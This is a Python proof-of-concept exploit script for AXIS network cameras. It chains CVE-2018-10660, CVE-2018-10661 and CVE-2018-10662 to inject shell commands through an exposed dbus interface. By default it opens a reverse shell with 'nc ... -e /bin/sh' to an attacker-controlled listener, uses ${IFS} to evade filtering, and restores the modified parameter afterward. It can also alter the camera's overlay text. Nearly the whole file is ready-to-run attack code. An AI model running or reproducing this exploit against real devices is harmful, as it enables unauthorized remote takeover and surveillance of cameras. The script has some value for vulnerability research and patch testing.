#!/usr/bin/env python
"""
POC for exploit of AXIS Network Cameras

https://www.axis.com/files/sales/ACV-128401_Affected_Product_List.pdf

CVE-2018-10660      Shell Command Injection
CVE-2018-10661      Access Control Bypass
CVE-2018-10662      Exposed Insecure Interface

USAGE:
./exploit.py -t TARGET_IP -tp TARGET_PORT -l LISTEN_IP -lp LISTEN_PORT

"""
import os
import requests
import random
import string
import argparse
from time import sleep

stage: int = 1

def logging(message: str):
    if not args.quiet:
        print(message, end="")

parser = argparse.ArgumentParser()
parser.add_argument("-a", "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
parser.add_argument("-c", "--command", type=str, help="Command to run (default: 'nc [LISTEN] [LISTEN_PORT] -e /bin/sh')")
parser.add_argument("-f", "--file", type=str, help="Target file path (default: index.shtml)")
parser.add_argument("-l", "--listen", type=str, help="Listener IP (default: response from http://checkip.amazonaws.com)")
parser.add_argument("-lp", "--listen-port", type=int, help="Listener port (default: 1337)")
parser.add_argument("-o", "--overlay", type=str, help="Image overlay text (optional)")
parser.add_argument("-p", "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode (no prompt, no output)")
parser.add_argument("-s", "--https", action="store_true", help="HTTPS")
parser.add_argument("-t", "--target", type=str, required=True, help="Target device IP")
parser.add_argument("-tp", "--target-port", type=int, help="Target device port (default: 80)")
parser.add_argument("-x", "--test", action="store_true", help="Test for vulnerability only")

args = parser.parse_args()

# Set some default values
target_ip = args.target
target_port = 80
target_file = "index.shtml"
target_proto = "http"
listen_ip = ""
listen_port = 1337
overlay_text = ""
req_proxy = ""

# Process arguments
if (args.target_port != None):
    target_port = args.target_port

if (args.proxy != None):
    if (args.proxy.split(':')[0] == "https"): req_proxy = {'https':args.proxy,}
    else: req_proxy = {'http':args.proxy,}

if (args.listen != None):
    listen_ip = args.listen
else:
    try:
        listen_ip = requests.get("http://checkip.amazonaws.com", proxies=req_proxy).text.strip()
    except:
        logging("Could not determine listener local IP address, quitting.")
        exit(1)

if (args.listen_port != None):
    listen_port = args.listen_port

if (args.file != None):
    target_file = args.file

if (args.https):
    target_proto = "https"

if (args.overlay):
    overlay_text = args.overlay

if (args.command):
    cmd = f"{args.command}"
else:
    cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"

logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\nCommand: {cmd}\n")
logging(f"\n")
# Character generation
def gen_chars(count: int) -> str:
    letters = ''.join(random.choice(string.ascii_lowercase) for i in range(count))
    return letters

# HTTP status checking
def http_check(req: requests, test: bool = False) -> int:
    match req.status_code:
        case 200:
            if not test:
                return 0

        case 204:
            logging(f"Empty response received. Success?\n")
            return 0
        
        case 303:
            if (test):
                if (req.text.find('Continue to') >= 0):
                    logging(f"Test connection SUCCESS\n")
                    return 0
                logging("Test connection FAIL")
            
            logging("Something went wrong")
            logging(req.status_code)
            logging(req.text)
        
        case 403:
            logging(f"Unable to connect.\nAUTH ERROR\n")
            logging(f"URL requested: {req.request}")
        
        case 404:
            logging(f"Specified target {req.request} not found.\n")
        
        case _:
            logging(f"Unexpected response from server.")
            logging(f"Received status code: {req.status_code}")
            logging(f"Response:\n{req.text}")
        
    logging("Quitting")
    return 1

target_url = f"{target_proto}://{target_ip}:{target_port}/{target_file}/{gen_chars(1)}.srv"

# Test for possible exploitation
def test_connect():
    global stage
    TEST_DATA = {
        'action': gen_chars(5),
        'return_page': gen_chars(5),
    }
    
    logging(f"+ Testing connection to device...\t\t\t\t")
    
    if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False), True):
        logging("Quitting")
        exit(1)

# Sync modifications
def sync_req():
    SYNC_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
    }
    
    logging(f"Syncing parameters...\t\t\t\t\t")
    
    if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
        exit(1)
    
    sleep(1)

# Attempts to modify image overlay
def overlay_req():
    global stage
    OVERLAY_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
    }

    logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")

    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
        exit(1)
        
    stage += 1

# Changes root.Time.DST.Enabled to 'True' for a baseline value
def command_reset_req():
    global stage
    RESET_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:True",
    }
    
    logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t")
    if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
        exit(1)
    
    sleep(1)
    stage += 1   

# Inject command into root.Time.DST.Enabled via dbus exploit    
def command_req():
    global stage
    cmd_ifs = cmd.replace(' ', "${IFS}")
    COMMAND_DATA = {
        'action': "dbus",
        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
    }
    
    logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t")
    if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
        exit(1)
    
    sleep(1)
    stage += 1

def main():

    test_connect()

    if (args.test):
        exit(0)
  
    logging("+ Preparing to execute exploit.\n")
    
    if not args.quiet:
        if not args.auto:
            input("= Start listener and press Enter to continue...")
    
    if (overlay_text != ""):
        overlay_req()
        sync_req()
    
    command_reset_req()
    sync_req()
    
    command_req()
    logging("+ Running sync to execute command\n")
    sync_req()
    
    command_reset_req()
    sync_req()
    

if __name__ == "__main__":
    main()    
